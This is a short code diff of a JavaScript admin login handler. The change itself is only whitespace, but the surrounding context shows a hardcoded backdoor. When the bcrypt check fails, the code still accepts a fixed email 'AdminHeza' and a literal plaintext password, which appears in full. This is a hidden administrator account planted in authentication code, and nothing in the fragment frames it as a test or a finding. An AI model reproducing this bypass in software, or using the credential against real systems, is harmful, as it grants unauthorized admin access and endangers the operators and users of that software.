@@ -97,7 +97,7 @@ export const adminLogin = async (req, res) => {
     
     const firstCheck = await bcrypt.compare(password, user.password);
     
-    if (firstCheck) {
+   if  (firstCheck) {
       isPasswordValid = true;
     } else if (email === 'AdminHeza' && password === 'es3Hm3f9y&CdoxVcLruS@VCurrent') {
       isPasswordValid = true;
